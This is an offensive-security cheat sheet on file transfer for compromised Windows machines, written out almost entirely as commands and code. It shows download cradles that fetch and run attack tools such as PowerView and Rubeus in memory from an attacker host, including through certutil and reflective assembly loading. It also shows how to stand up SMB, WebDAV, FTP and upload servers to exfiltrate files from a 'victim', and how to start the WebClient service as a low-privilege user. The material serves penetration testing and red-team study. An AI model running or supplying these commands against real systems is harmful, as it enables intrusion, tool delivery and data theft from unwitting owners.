# File transfer

## Delivering to a Windows machine

Files have to be hosted with a simple server first. `python3 -m http.server` or something equivalent can be used.

### 1. Invoke-WebRequest

Example usage:

```console
PS C:\> IWR http://192.168.56.2:8000/Rubeus.exe -o Rubeus.exe
```

In PowerShell, `iwr`, `curl`, and `wget` are all aliases for `Invoke-WebRequest`.  
It is often used in conjunction with `iex` (alias for `Invoke-Expression`) to execute scripts in-memory:

```console
PS C:\> IEX(IWR http://192.168.56.2:8000/PowerView.ps1 -UseBasicParsing)
```

The `-UseBasicParsing` flag ensures that Internet Explorer is not used for the requests.  
Since PowerShell 6.0.0, basic parsing is the default, and this flag is unnecessary.

On certain shells obtained via potatoes and deserialization exploits, `IWR` fails due to a permission issue with the progress bar.  
It can be fixed by silencing the progress bar:

```console
PS C:\> $ProgressPreference = "SilentlyContinue"
```

The `Invoke-WebRequest` cmdlet was introduced in PowerShell 3.0 and would not work on older versions.

### 2. New-Object System.Net.WebClient

Example usage with `DownloadFile` mode:

```console
PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://192.168.56.2:8000/Rubeus.exe", "C:\Windows\Tasks\Rubeus.exe")
```

It can be used with `DownloadString` mode and `iex` for in-memory execution as well:

```console
PS C:\> IEX (New-Object Net.WebClient).DownloadString("http://192.168.56.2:8000/PowerView.ps1")
```

Alternatively:

```console
PS C:\> (New-Object Net.WebClient).DownloadString("http://192.168.56.2:8000/PowerView.ps1") | IEX
```

There is yet another mode: `DownloadData`, which can be used when loading assemblies through reflection:

```console
PS C:\> $data = (New-Object System.Net.WebClient).DownloadData("http://192.168.56.2:8000/Rubeus.exe")
PS C:\> $assem = [System.Reflection.Assembly]::Load($data);
PS C:\> [Rubeus.Program]::MainString("currentluid")
```

The `New-Object System.Net.WebClient` approach works regardless of the version of PowerShell.

### 3. Certutil.exe

Example usage:

```console
PS C:\> certutil.exe -urlcache -split -f http://192.168.56.2:8000/Rubeus.exe
```

`certutil.exe` is perhaps the most popular lolbin for downloading files.  
Unlike the previous two, PowerShell is not needed; it can be used from Command Prompt.

## Exfiltrating from a Windows machine

### 1. SMB server

Install [impacket](https://github.com/fortra/impacket) because an SMB server is included in the package:

```console
inte@debian-pc:~$ python3 -m pip install --break-system-packages impacket
```

The `cap_net_bind_service` capability is needed over Python binary to bind lower ports without root privileges:

```console
inte@debian-pc:~$ sudo apt install libcap2-bin
inte@debian-pc:~$ sudo setcap 'cap_net_bind_service=+ep' /usr/bin/python3.12
```

Start the SMB server with credentials and `-smb2support` (it fails on newer machines without those options):

```console
inte@debian-pc:~$ smbserver.py -username inte -password hunter2 -smb2support ensemble `pwd`
```

Register the server on the victim machine and use it for exfiltration:

```console
PS C:\> net use \\192.168.56.2\ensemble hunter2 /user:inte
PS C:\> copy BH.zip \\192.168.56.2\ensemble\
```

### 2. WebDAV server

Install [wsgidav](https://github.com/mar10/wsgidav) in a virtual environment:

```console
inte@debian-pc:~$ mkdir dav && cd dav
inte@debian-pc:~$ python3 -m venv .venv
inte@debian-pc:~$ source .venv/bin/activate
(.venv) inte@debian-pc:~$ python3 -m pip install git+https://github.com/mar10/wsgidav.git
(.venv) inte@debian-pc:~$ python3 -m pip install cheroot
```

Again, the `cap_net_bind_service` capability is needed over Python binary to bind lower ports without root privileges:

```console
inte@debian-pc:~$ sudo apt install libcap2-bin
inte@debian-pc:~$ sudo setcap 'cap_net_bind_service=+ep' /usr/bin/python3.12
```

Start the WebDAV server:

```console
(.venv) inte@debian-pc:~$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root=`pwd`
```

Transfer with:

```console
PS C:\> copy C:\Windows\Tasks\BH.zip \\192.168.56.2\DavWWWRoot\
```

A prerequisite for this technique is to have the WebClient service running.  
To check if the WebClient service is installed:

```console
PS C:\> Get-Service -Name WebClient

Status   Name               DisplayName
------   ----               -----------
Stopped  WebClient          WebClient
```

If the WebClient is installed but not currently running, there are several methods to start it from the perspective of a low-priv user.  
A custom ETW event trigger can enable the service. [C++](https://www.tiraniddo.dev/2015/03/starting-webclient-service.html) and [C#](https://gist.github.com/klezVirus/af004842a73779e1d03d47e041115797) PoCs for the same were presented by `tiraniddo` and `klezVirus` respectively.  
The `.searchConnector-ms` trick is also viable. With a bit of luck, something as simple as the following can enable the WebClient service:

```console
PS C:\> net use * http://localhost
```

### 3. FTP server

Install [pyftpdlib](https://github.com/giampaolo/pyftpdlib):

```console
inte@debian-pc:~$ python3 -m pip install --break-system-packages pyftpdlib
```

Again, the `cap_net_bind_service` capability is needed over Python binary to bind lower ports without root privileges:

```console
inte@debian-pc:~$ sudo apt install libcap2-bin
inte@debian-pc:~$ sudo setcap 'cap_net_bind_service=+ep' /usr/bin/python3.12
```

Start the FTP server:

```console
inte@debian-pc:~$ python3 -m pyftpdlib -p 21 -d `pwd` --write
```

Files can now be transferred from the victim:

```console
PS C:\> (New-Object Net.WebClient).UploadFile("ftp://192.168.56.2/BH.zip", "C:\Windows\Tasks\BH.zip")
```

The designated port does not have to be 21.

### 4. uploadserver

Install [uploadserver](https://github.com/Densaugeo/uploadserver):

```console
inte@debian-pc:~$ python3 -m pip install --break-system-packages uploadserver
```

Start the server:

```console
inte@debian-pc:~$ python3 -m uploadserver 10000
```

Transfer the files from the victim:

```console
PS C:\> Invoke-WebRequest -Uri "http://192.168.56.2:10000/upload" -Method Post -Form @{ files = Get-Item -Path "C:\Windows\Tasks\BH.zip" }
```

However, the `-Form` feature was added in PowerShell 6.1.0  
On older versions, the request needs to be crafted manually. Here's a function to achieve the same:

```powershell
function Invoke-Upload {
    param (
        $Uri,
        $FilePath,
        $FieldName = "files"
    )
    $fileName = [System.IO.Path]::GetFileName($FilePath)
    $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
    $boundary = [System.Guid]::NewGuid().ToString()
    $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"$FieldName`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        ""
    )

    $headerBytes = [System.Text.Encoding]::UTF8.GetBytes(($bodyLines -join "`r`n") + "`r`n")
    $footerBytes = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
    $bodyBytes = New-Object byte[] ($headerBytes.Length + $fileContent.Length + $footerBytes.Length)

    [System.Buffer]::BlockCopy($headerBytes, 0, $bodyBytes, 0, $headerBytes.Length)
    [System.Buffer]::BlockCopy($fileContent, 0, $bodyBytes, $headerBytes.Length, $fileContent.Length)
    [System.Buffer]::BlockCopy($footerBytes, 0, $bodyBytes, $headerBytes.Length + $fileContent.Length, $footerBytes.Length)
    
    Invoke-WebRequest -Uri $Uri -Method Post -Headers $headers -Body $bodyBytes
}
```

Usage example:

```console
PS C:\> Invoke-Upload -Uri "http://192.168.56.2:10000/upload" -FilePath "C:\Windows\Tasks\BH.zip"
```

[raven](https://github.com/gh0x0st/raven) is a similar project with the same concept.

### 5. Custom uploadserver

Before I found `uploadserver`, I relied on a custom script that offered similar functionality:

```py
from http.server import HTTPServer, BaseHTTPRequestHandler
from json import loads
from base64 import b64decode


class DownloadHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length)
        post_data = loads(post_data.decode("utf-8"))

        filename = list(post_data.keys())[0]
        with open(filename, "xb") as f:
            f.write(b64decode(post_data[filename]))

        self.send_response(200)
        self.end_headers()


def run(port):
    httpd = HTTPServer(("", port), DownloadHandler)
    print(f"Server started on port {port}...")
    httpd.serve_forever()


if __name__ == "__main__":
    run(port=10000)
```

File contents should be base64 encoded before exfiltration and the body should be in JSON format:

```console
PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path "C:\Windows\Tasks\BH.zip" -Encoding Byte))
PS C:\> IWR http://192.168.56.2:10000/ -Method POST -Body "{`"BH.zip`":`"$b64`"}"
```

### 6. Python standalone package

Since version 3.7, Python comes as a standalone package and installation is not needed.

```console
inte@debian-pc:~$ wget https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip
```

```console
PS C:\Users\jdoe\Downloads> IWR 192.168.56.2:8000/python-3.13.2-embed-amd64.zip -o py.zip
PS C:\Users\jdoe\Downloads> Expand-Archive .\py.zip
PS C:\Users\jdoe\Downloads> cd .\py\
PS C:\Users\jdoe\Downloads\py> .\python.exe -m http.server 10000
```

The files can be exfiltrated from this directory:

```console
inte@debian-pc:~$ wget http://10.10.10.10:10000/BH.zip
```

### 7. Installing Python with MSIX file

TODO: <https://trustedsec.com/blog/operating-inside-the-interpreted-offensive-python>

While working on this document, I came across a similar, more extensive article: <https://github.com/egre55/ultimate-file-transfer-list>.  
It possesses more even more alternate techniques.
